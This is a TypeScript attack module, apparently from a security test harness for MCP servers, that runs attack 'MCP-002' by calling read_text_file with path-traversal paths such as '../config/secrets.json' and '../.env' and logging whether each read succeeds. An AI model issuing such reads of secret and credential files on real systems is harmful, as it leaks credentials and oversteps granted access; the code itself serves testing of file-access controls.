import type { MCPClient } from '../attack-runner/mcp_client.js';
import type { AttackLogEntry } from '../attack-runner/attack_types.js';

export async function runAttack(
  client: MCPClient,
  logStep: (entry: AttackLogEntry) => void
): Promise<void> {
  let step = 0;

  // Step 1: Try to read a config file (should be blocked but bypassed)
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: '../config/secrets.json' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../config/secrets.json' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../config/secrets.json' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 2: Try to read .env file (should be blocked but bypassed)
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: '../.env' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../.env' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../.env' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 3: Try to read a file with "config" in the path
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: 'config/settings.json' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'config/settings.json' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-002',
      variant: 'hardcoded-secret-leak',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'config/settings.json' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }
}

